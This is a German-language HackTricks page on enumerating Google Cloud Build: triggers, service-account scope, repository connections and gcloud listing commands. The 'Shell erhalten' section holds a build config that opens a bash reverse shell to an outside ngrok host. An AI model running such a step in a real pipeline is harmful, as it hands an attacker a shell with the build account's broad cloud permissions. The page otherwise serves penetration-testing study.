# GCP - Cloud Build Enum

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositorys einreichen.

</details>

## Grundlegende Informationen

Google Cloud Build ist eine verwaltete CI/CD-Plattform, die den **Software-Build- und Release-Prozess automatisiert**, sich mit **Quellcode-Repositories integriert** und eine Vielzahl von Programmiersprachen unterst√ºtzt. Es erm√∂glicht Entwicklern, Code automatisch zu **erstellen, zu testen und bereitzustellen**, w√§hrend es Flexibilit√§t bietet, Build-Schritte und Workflows anzupassen.

Jeder Cloud Build Trigger ist **mit einem Cloud-Repository verbunden oder direkt mit einem externen Repository verkn√ºpft** (Github, Bitbucket und Gitlab).

{% hint style="success" %}
Ich konnte keine M√∂glichkeit sehen, den Github/Bitbucket-Token von hier oder von Cloud-Repositories zu stehlen, da beim Herunterladen des Repositories √ºber eine [https://source.cloud.google.com/](https://source.cloud.google.com/) URL zugegriffen wird und Github nicht vom Client aus aufgerufen wird.
{% hint %}

### Ereignisse

Der Cloud Build kann ausgel√∂st werden, wenn:

* **Ein Push auf einen Branch erfolgt**: Branch angeben
* **Ein neues Tag gepusht wird**: Tag angeben
* **Pull-Request**: Branch angeben, der den PR erh√§lt
* **Manuelle Ausl√∂sung**
* **Pub/Sub-Nachricht**: Thema angeben
* **Webhook-Ereignis**: Es wird eine HTTPS-URL freigegeben und die Anfrage muss mit einem Geheimnis authentifiziert werden

### Ausf√ºhrung

Es gibt 3 Optionen:

* Ein yaml/json, das die auszuf√ºhrenden Befehle angibt. Normalerweise: `/cloudbuild.yaml`
* Nur einer, der "inline" im Web-Portal und in der Befehlszeile angegeben werden kann
* G√§ngigste Option
* Relevant f√ºr nicht authentifizierten Zugriff
* Ein **Dockerfile** zum Erstellen
* Ein **Buildpack** zum Erstellen

### SA-Berechtigungen

Der **Service Account hat den `cloud-platform`-Bereich**, sodass er **alle Berechtigungen verwenden kann**. Wenn **kein SA angegeben ist** (wie beim Ausf√ºhren von submit), wird der **Standard-SA** `<proj-number>@cloudbuild.gserviceaccount.com` **verwendet**.

Standardm√§√üig werden keine Berechtigungen erteilt, aber es ist recht einfach, einige zu erteilen:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Genehmigungen

Es ist m√∂glich, einen Cloud Build so zu konfigurieren, dass **Genehmigungen f√ºr Build-Ausf√ºhrungen erforderlich sind** (standardm√§√üig deaktiviert).

### Verbindungen & Repositories

Verbindungen k√∂nnen √ºber folgende erstellt werden:

* **GitHub:** Es wird eine OAuth-Aufforderung angezeigt, die um Berechtigungen bittet, um **einen Github-Token zu erhalten**, der im **Secret Manager** gespeichert wird.
* **GitHub Enterprise:** Es wird gefragt, ob ein **GithubApp** installiert werden soll. Ein **Authentifizierungstoken** von Ihrem GitHub Enterprise-Host wird erstellt und in diesem Projekt als **Secret Manager**-Geheimnis gespeichert.
* **GitLab / Enterprise:** Sie m√ºssen den API-Zugriffstoken und den Lese-API-Zugriffstoken bereitstellen, die im **Secret Manager** gespeichert werden.

Sobald eine Verbindung hergestellt wurde, k√∂nnen Sie sie verwenden, um **Repositories zu verkn√ºpfen, auf die das Github-Konto Zugriff hat**.

Diese Option ist √ºber die Schaltfl√§che verf√ºgbar:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Beachten Sie, dass mit dieser Methode verbundene Repositories **nur in Triggern der 2. Generation verf√ºgbar sind**.
{% hint %}

### Repository verkn√ºpfen

Dies ist nicht dasselbe wie eine **`Verbindung`**. Dies erm√∂glicht **unterschiedliche** M√∂glichkeiten, auf ein Github- oder Bitbucket-Repository zuzugreifen, **erstellt jedoch kein Verbindungsobjekt, sondern ein Repository-Objekt (der 1. Generation).**

Diese Option ist √ºber die Schaltfl√§che verf√ºgbar:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Speicher

Manchmal wird Cloud Build **einen neuen Speicherplatz generieren, um die Dateien f√ºr den Trigger zu speichern**. Dies geschieht beispielsweise im Beispiel, das GCP anbietet mit:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Ein Speicherbucket namens [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) wird erstellt, um eine `.tgz`-Datei mit den zu verwendenden Dateien zu speichern.

### Shell erhalten
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Enumeration

Sie k√∂nnten **sensible Informationen in Build-Konfigurationen und Protokollen** finden.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Privilege Escalation

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Unauthenticated Access

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Post Exploitation

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
